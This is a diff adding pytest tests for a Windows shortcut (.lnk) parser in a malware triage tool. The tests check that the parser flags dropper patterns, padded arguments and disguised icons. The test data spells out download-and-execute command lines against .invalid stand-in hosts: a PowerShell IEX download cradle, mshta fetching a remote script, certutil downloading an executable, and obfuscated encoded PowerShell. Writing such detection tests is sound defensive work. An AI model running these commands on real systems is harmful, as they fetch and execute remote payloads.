@@ -55,6 +55,8 @@ from maltriage import msdoc as msdoc_module
 from maltriage import xlm as xlm_module
 from maltriage import diff as diff_module
 from maltriage import scripts as scripts_module
+from maltriage import lnk as lnk_module
+from maltriage.fixtures import build_lnk
 from maltriage import base as base_module
 from maltriage import elf as elf_module
 from maltriage import pe as pe_module
@@ -10550,3 +10552,378 @@ def test_ordinary_text_is_cheap_to_rule_out():
     started = time.perf_counter()
     scripts_module.scan(text)
     assert time.perf_counter() - started < 0.6
+
+
+
+# Windows shortcuts (v0.7.3)
+#
+# Every shortcut here is built by `build_lnk` and is harmless: the targets
+# are notepad, calc and PowerShell, the URLs are under .invalid, and the
+# encoded command decodes to `IEX (New-Ob`. None is committed as a file.
+
+_LNK_PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+_LNK_CMD = "C:\\Windows\\System32\\cmd.exe"
+_LNK_ENC = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj"
+
+
+def _lnk(write, name="a.lnk", **kwargs):
+    report = analyse(write(name, build_lnk(**kwargs)))
+    return report, report.data.get("lnk") or {}
+
+
+def _lnk_keys(report):
+    return {f["key"]: f for f in report.findings if f["key"].startswith("lnk_")}
+
+
+def test_a_shortcut_is_identified_by_its_header(write):
+    report, data = _lnk(write)
+    assert report.data["filetype"]["family"] == "lnk"
+    assert data["targets"]["id_list"] == "C:\\Windows\\System32\\notepad.exe"
+    assert data["targets"]["link_info"] == "C:\\Windows\\System32\\notepad.exe"
+    assert data["machine_id"] == "test-pc"
+    assert not any(f["key"] == "unrecognised_format" for f in report.findings)
+
+
+def test_four_bytes_of_header_size_are_not_a_shortcut(write):
+    report = analyse(write("a.bin", b"\x4c\x00\x00\x00" + b"\x00" * 200))
+    assert report.data["filetype"]["family"] == "unknown"
+    assert "lnk" not in report.data
+
+
+def test_an_ordinary_shortcut_says_nothing(write):
+    report, data = _lnk(write, target="C:\\Program Files\\Some App\\app.exe",
+                        working_dir="C:\\Program Files\\Some App",
+                        icon="C:\\Program Files\\Some App\\app.exe")
+    assert _lnk_keys(report) == {}
+    assert data["shapes"] == [] and data["interpreters"] == []
+
+
+def test_the_powershell_start_menu_shortcut_is_capability_not_a_finding_at_the_gate(write):
+    report, _ = _lnk(write, target=_LNK_PS, working_dir="%HOMEDRIVE%%HOMEPATH%")
+    keys = _lnk_keys(report)
+    assert set(keys) == {"lnk_interpreter_target"}
+    assert keys["lnk_interpreter_target"]["severity"] == "low"
+    assert not at_gate(report, "medium")
+
+
+@pytest.mark.parametrize("target, arguments, shape", [
+    (_LNK_PS, f"-nop -w hidden -enc {_LNK_ENC}", "encoded PowerShell launch"),
+    (_LNK_PS, "-nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.invalid/a')\"",
+     "PowerShell download cradle"),
+    ("C:\\Windows\\System32\\mshta.exe", "http://x.invalid/a.hta", "mshta running remote script"),
+    (_LNK_CMD, "/c certutil -urlcache -split -f http://x.invalid/a.exe %TEMP%\\a.exe",
+     "certutil fetching a URL"),
+    (_LNK_CMD, f"/c p^o^w^e^r^s^h^e^l^l -e^n^c {_LNK_ENC}", "encoded PowerShell launch"),
+])
+def test_a_dropper_shaped_command_line_reaches_the_gate(write, target, arguments, shape):
+    report, data = _lnk(write, target=target, arguments=arguments)
+    finding = _lnk_keys(report)["lnk_dropper"]
+    assert shape in data["shapes"]
+    assert finding["severity"] == "medium"
+    assert at_gate(report, "medium")
+
+
+def test_the_shape_spans_the_target_and_the_arguments(write):
+    """`powershell.exe` is the target and `-enc ...` the arguments: neither
+    alone is the shape, and the command line is."""
+    report, data = _lnk(write, target=_LNK_PS, arguments=f"-enc {_LNK_ENC}")
+    assert data["shapes"] == ["encoded PowerShell launch"]
+    report, data = _lnk(write, target="C:\\Tools\\app.exe", arguments=f"-enc {_LNK_ENC}")
+    assert data["shapes"] == []
+
+
+def test_padding_hides_nothing_from_the_shapes(write):
+    """The arguments padded with whitespace and line breaks, the way the
+    real command is pushed out of the Properties dialog."""
+    arguments = " " * 300 + "\r\n" * 40 + f"-w hidden\n\n-enc {_LNK_ENC}"
+    report, data = _lnk(write, target=_LNK_PS, arguments=arguments)
+    keys = _lnk_keys(report)
+    assert data["shapes"] == ["encoded PowerShell launch"]
+    assert "lnk_padded_arguments" in keys
+    assert data["longest_whitespace_run"] >= 300
+
+
+def test_ordinary_arguments_are_not_padding(write):
+    report, data = _lnk(write, target="C:\\Program Files\\App\\app.exe",
+                        arguments='--profile "Default User"  --new-window')
+    assert "lnk_padded_arguments" not in _lnk_keys(report)
+
+
+def test_a_line_break_alone_is_padding(write):
+    report, _ = _lnk(write, target="C:\\Program Files\\App\\app.exe", arguments="a\nb")
+    assert "lnk_padded_arguments" in _lnk_keys(report)
+
+
+def test_an_interpreter_wearing_a_document_icon_is_reported(write):
+    report, data = _lnk(write, target=_LNK_PS, arguments="-c Get-Date",
+                        icon="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe")
+    assert _lnk_keys(report)["lnk_document_icon"]["severity"] == "low"
+    assert data["document_icon"] == "msedge.exe"
+    report, _ = _lnk(write, target=_LNK_CMD, icon="C:\\Users\\Public\\invoice.pdf")
+    assert "lnk_document_icon" in _lnk_keys(report)
+
+
+def test_a_document_icon_on_a_program_is_not_a_disguise(write):
+    """Acrobat's own shortcut has Acrobat's icon."""
+    report, _ = _lnk(write, target="C:\\Program Files\\Adobe\\Acrobat\\Acrobat.exe",
+                     icon="C:\\Program Files\\Adobe\\Acrobat\\Acrobat.exe")
+    assert "lnk_document_icon" not in _lnk_keys(report)
+
+
+def test_an_icon_from_the_environment_block_counts(write):
+    report, _ = _lnk(write, target=_LNK_PS, icon_environment="%ProgramFiles%\\Microsoft\\Edge\\msedge.exe")
+    assert "lnk_document_icon" in _lnk_keys(report)
+
+
+def test_a_minimised_interpreter_is_a_hidden_window(write):
+    report, _ = _lnk(write, target=_LNK_PS, arguments="-c Get-Date", show=7)
+    assert "lnk_hidden_window" in _lnk_keys(report)
+    report, _ = _lnk(write, target="C:\\Program Files\\App\\app.exe", show=7)
+    assert "lnk_hidden_window" not in _lnk_keys(report)
+    report, _ = _lnk(write, target=_LNK_PS, arguments="-WindowStyle Hidden -c Get-Date")
+    assert "lnk_hidden_window" in _lnk_keys(report)
+
+
+def test_data_after_the_shortcut_is_reported(write):
+    report, data = _lnk(write, trailing=b"PK\x03\x04" + b"\x00" * 60)
+    assert data["appended_bytes"] == 64
+    assert _lnk_keys(report)["lnk_appended_data"]["severity"] == "low"
+
+
+def test_appended_data_past_the_read_limit_is_still_counted(write):
+    config = {**DEFAULT_CONFIG, "lnk_max_bytes": 4096}
+    path = write("a.lnk", build_lnk(trailing=b"\x00" * 100_000))
+    data = analyse(path, config=config).data["lnk"]
+    assert data["appended_bytes"] >= 100_000 - 4096
+    assert any("first 4096 bytes" in p for p in data["parse_errors"])
+
+
+def test_the_arguments_never_reach_a_report(write):
+    marker = "zqxmarkerzqx"
+    report, data = _lnk(write, target=_LNK_PS, arguments=f"-c Write-Output {marker}",
+                        description=f"{marker} description")
+    assert marker not in json.dumps(report.to_dict())
+    assert data["arguments_length"] == len(f"-c Write-Output {marker}")
+    assert data["has_description"] is True
+
+
+def test_every_place_a_shortcut_names_its_target_is_read(write):
+    """The item list says notepad and the environment block says
+    PowerShell. A reader that trusted one would be told which to trust."""
+    report, data = _lnk(write, target="C:\\Windows\\System32\\notepad.exe",
+                        environment="%windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                        arguments=f"-enc {_LNK_ENC}")
+    assert data["targets"]["environment"].endswith("powershell.exe")
+    assert data["interpreters"] == ["powershell.exe"]
+    assert "encoded PowerShell launch" in data["shapes"]
+
+
+def test_a_shortcut_with_only_an_environment_block_is_read(write):
+    report, data = _lnk(write, id_list=False, link_info=False,
+                        environment="%COMSPEC%", arguments="/c calc")
+    assert data["targets"] == {"environment": "%COMSPEC%"}
+
+
+@pytest.mark.parametrize("version", [3, 7, 8, 9])
+def test_long_names_are_read_from_every_extension_block_version(write, version):
+    """`POWERS~1.EXE` is what the item stores as its primary name; the long
+    name is in an extension block whose layout moved twice."""
+    _, data = _lnk(write, target=_LNK_PS, link_info=False, short_names=True, item_version=version)
+    assert data["targets"]["id_list"] == _LNK_PS
+    assert data["interpreters"] == ["powershell.exe"]
+
+
+def test_an_ansi_shortcut_is_read(write):
+    _, data = _lnk(write, target=_LNK_PS, arguments="-c x", unicode=False)
+    assert data["targets"]["link_info"] == _LNK_PS
+    assert data["arguments_length"] == 4
+
+
+def test_sample_paths_are_made_safe_to_print(write):
+    _, data = _lnk(write, target="C:\\x\\\x1b[2Japp.exe", link_info=True, id_list=False)
+    assert "\x1b" not in data["targets"]["link_info"]
+
+
+def test_a_shortcut_inside_a_zip_is_read(write):
+    """Where most of them arrive: `invoice.pdf.lnk` in an archive."""
+    member = build_lnk(target=_LNK_PS, arguments=f"-w hidden -enc {_LNK_ENC}")
+    report = analyse(write("invoice.zip", _zip_bytes([("invoice.pdf.lnk", member)])))
+    assert at_gate(report, "medium")
+    assert report.children[0].data["lnk"]["shapes"] == ["encoded PowerShell launch"]
+
+
+def test_a_corpus_counts_shortcuts_as_their_own_family(tmp_path):
+    benign = tmp_path / "benign"
+    benign.mkdir()
+    (benign / "a.lnk").write_bytes(build_lnk())
+    result = corpus_module.scan_corpus(tmp_path)
+    assert result.families["benign"] == {"lnk": 1}
+
+
+def test_the_script_reader_leaves_shortcuts_alone(write):
+    report, _ = _lnk(write, target=_LNK_PS, arguments="-c Get-Date")
+    assert "script" not in report.data
+
+
+def test_every_truncation_of_a_shortcut_is_read_without_raising():
+    whole = build_lnk(target=_LNK_PS, arguments=f"-enc {_LNK_ENC}", icon="C:\\x.ico",
+                      working_dir="C:\\", environment="%windir%\\x.exe",
+                      icon_environment="%windir%\\y.ico", description="d")
+    for end in range(len(whole) + 1):
+        parsed = lnk_module.parse(whole[:end])
+        lnk_module.assess(parsed)
+        if end < len(whole):
+            assert parsed["problems"], end
+
+
+def test_mutated_shortcuts_are_read_without_raising_and_quickly():
+    rng = random.Random(7)
+    whole = build_lnk(target=_LNK_PS, arguments=f"-enc {_LNK_ENC}", icon="C:\\x.ico",
+                      environment="%windir%\\x.exe", short_names=True)
+    started = time.perf_counter()
+    for _ in range(3000):
+        data = bytearray(whole)
+        for _ in range(rng.randint(1, 8)):
+            at = rng.randrange(20, len(data))
+            data[at] = rng.randrange(256)
+        lnk_module.assess(lnk_module.parse(bytes(data)))
+    assert time.perf_counter() - started < 20
+
+
+def test_counts_the_file_supplies_are_bounded():
+    """An item list that claims 65,535 bytes, a LinkInfo that claims 4 GiB,
+    a string count past the end, and a chain of a thousand extra blocks."""
+    whole = bytearray(build_lnk(target=_LNK_PS))
+    whole[0x4C:0x4E] = b"\xff\xff"
+    assert lnk_module.parse(bytes(whole))["problems"]
+
+    whole = bytearray(build_lnk(target=_LNK_PS, id_list=False))
+    whole[0x4C:0x50] = b"\xff\xff\xff\xff"
+    assert lnk_module.parse(bytes(whole))["problems"]
+
+    header = bytearray(build_lnk(id_list=False, link_info=False, machine_id=None))
+    struct.pack_into("<I", header, 20, 0x80 | 0x20)
+    assert lnk_module.parse(bytes(header[:0x4C]) + b"\xff\xff" + b"A\x00" * 10)["problems"]
+
+    blocks = b"".join(struct.pack("<II", 8, 0xA0000002) for _ in range(1000))
+    plain = build_lnk(id_list=False, link_info=False, machine_id=None)
+    parsed = lnk_module.parse(plain[:-4] + blocks + b"\x00" * 4)
+    assert len(parsed["extra_blocks"]) == lnk_module._MAX_BLOCKS
+    assert parsed["problems"]
+
+
+def test_the_reader_agrees_with_lnkparse3():
+    """An independent parser, where it is installed. It reads primary
+    names rather than long names, so the item list is compared through
+    the LinkInfo path instead."""
+    LnkParse3 = pytest.importorskip("LnkParse3")
+    cases = [
+        dict(target=_LNK_PS, arguments=f"-enc {_LNK_ENC}", icon="C:\\a.ico", working_dir="C:\\w",
+             environment="%windir%\\x.exe", description="d", relative_path="..\\x.exe"),
+        dict(target="C:\\Program Files\\App\\app.exe", unicode=False, arguments="-x"),
+        dict(target=_LNK_CMD, id_list=False, machine_id="host-1"),
+    ]
+    for case in cases:
+        raw = build_lnk(**case)
+        mine = lnk_module.parse(raw)
+        theirs = LnkParse3.lnk_file(io.BytesIO(raw)).get_json()
+        data = theirs.get("data", {})
+        assert mine.get("arguments") == data.get("command_line_arguments")
+        assert mine.get("icon_location") == data.get("icon_location")
+        assert mine.get("working_dir") == data.get("working_directory")
+        assert mine.get("relative_path") == data.get("relative_path")
+        assert mine["targets"].get("link_info") == theirs["link_info"]["local_base_path"]
+        tracker = theirs.get("extra", {}).get("DISTRIBUTED_LINK_TRACKER_BLOCK", {})
+        assert mine.get("machine_id") == tracker.get("machine_identifier")
+
+
+
+def test_no_module_level_name_in_this_file_is_defined_twice():
+    """v0.7.3's tests defined `_CMD` for a shortcut path 2,800 lines after
+    the DDE tests defined it for a field, and six DDE tests failed because
+    they now read the shortcut's. A test function defined twice fails
+    nothing at all: the first silently stops running."""
+    tree = ast.parse(Path(__file__).read_text(encoding="utf-8"))
+    names = collections.Counter()
+    for node in tree.body:
+        if isinstance(node, (ast.FunctionDef, ast.ClassDef)):
+            names[node.name] += 1
+        elif isinstance(node, ast.Assign):
+            names.update(t.id for t in node.targets if isinstance(t, ast.Name))
+    assert [name for name, count in names.items() if count > 1] == []
+
+
+
+@pytest.mark.parametrize("spaces, padded", [(63, False), (64, True), (300, True)])
+def test_a_long_run_of_spaces_alone_is_padding(write, spaces, padded):
+    report, _ = _lnk(write, target="C:\\Program Files\\App\\app.exe",
+                     arguments="-a" + " " * spaces + "-b")
+    assert ("lnk_padded_arguments" in _lnk_keys(report)) is padded
+
+
+def test_the_unicode_linkinfo_path_is_preferred(write):
+    """`Zoë` survives the ANSI copy as `Zo?` on some code pages, and a CJK
+    name does not survive it at all."""
+    target = "C:\\Users\\Zoë\\文档\\app.exe"
+    _, data = _lnk(write, target=target, id_list=False, link_info_unicode=True)
+    assert data["targets"]["link_info"] == target
+
+
+def test_an_unread_shell_item_ends_the_path_and_says_so():
+    whole = build_lnk(target="C:\\Windows\\System32\\notepad.exe", link_info=False)
+    # The first file entry's class byte, after the root and volume items.
+    root = 20
+    volume = struct.unpack_from("<H", whole, 0x4C + 2 + root)[0]
+    at = 0x4C + 2 + root + volume + 2
+    mutated = bytearray(whole)
+    mutated[at] = 0x61
+    parsed = lnk_module.parse(bytes(mutated))
+    assert parsed["targets"]["id_list"] == "C:"
+    assert any("class 0x61" in problem for problem in parsed["problems"])
+
+
+def test_a_long_name_that_disagrees_with_its_primary_name_is_the_one_reported(write):
+    """The shell resolves and shows the long name. A shortcut whose 8.3
+    primary says NOTEPAD.EXE and whose long name says powershell.exe is
+    a shortcut to PowerShell."""
+    whole = build_lnk(target="C:\\Windows\\System32\\powershell.exe", link_info=False,
+                      short_names=True)
+    mutated = whole.replace(b"POWERS~1.EXE\x00", b"NOTEPAD1.EXE\x00", 1)
+    assert mutated != whole
+    assert lnk_module.assess(lnk_module.parse(mutated))["interpreters"] == ["powershell.exe"]
+
+
+def test_the_extension_block_is_found_from_the_pointer_at_the_end_of_the_item():
+    """A primary name followed by more NUL bytes than its padding moves the
+    extension block away from where the name ends; the item's own pointer
+    still says where it is."""
+    whole = build_lnk(target="C:\\Windows\\System32\\powershell.exe", link_info=False)
+    mutated = whole.replace(b"powershell.exe\x00", b"NOTEPAD.EXE\x00\x00\x00\x00", 1)
+    assert mutated != whole
+    assert lnk_module.assess(lnk_module.parse(mutated))["interpreters"] == ["powershell.exe"]
+
+
+def test_the_shortcut_reader_keeps_at_most_its_limit():
+    extractor = lnk_module.LnkExtractor()
+    extractor.begin(Path("x"), {"family": "lnk"}, {**DEFAULT_CONFIG, "lnk_max_bytes": 4096})
+    extractor.feed(build_lnk() + b"\x00" * 1_000_000)
+    assert len(extractor._buffer) == 4096
+
+
+def test_a_long_name_slot_holding_control_bytes_falls_back_to_the_primary_name():
+    from maltriage import fixtures as fixtures_module
+    item = bytearray(fixtures_module._file_entry("abcdefghij.exe", True, True, 9))
+    at = item.index(struct.pack("<I", 0xBEEF0004)) - 4
+    long_at = at + 46
+    item[long_at:long_at + 4] = b"\x01\x00\x02\x00"
+    assert lnk_module._id_list_path(bytes(item) + b"\x00\x00", []) == "ABCDEF~1.EXE"
+
+
+def test_the_extension_block_after_an_odd_length_primary_name_is_found_without_its_pointer():
+    """`ABCDEF~1.EXE` and its NUL are thirteen bytes, so one byte of padding
+    precedes the extension block. With the pointer at the end of the item
+    unusable, the block is where the padded name ends."""
+    from maltriage import fixtures as fixtures_module
+    item = bytearray(fixtures_module._file_entry("abcdefghij.exe", True, True, 9))
+    item[-2:] = b"\x00\x00"
+    assert lnk_module._id_list_path(bytes(item) + b"\x00\x00", []) == "abcdefghij.exe"
